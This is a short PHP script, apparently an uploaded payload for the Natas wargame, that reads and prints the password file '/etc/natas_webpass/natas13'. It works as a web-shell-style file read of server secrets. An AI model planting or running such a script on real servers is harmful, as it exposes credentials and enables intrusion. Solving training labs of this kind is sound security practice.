<?php
$file = fopen('/etc/natas_webpass/natas13', 'r');
echo fread($file, filesize('/etc/natas_webpass/natas13'));
fclose($file);
?>
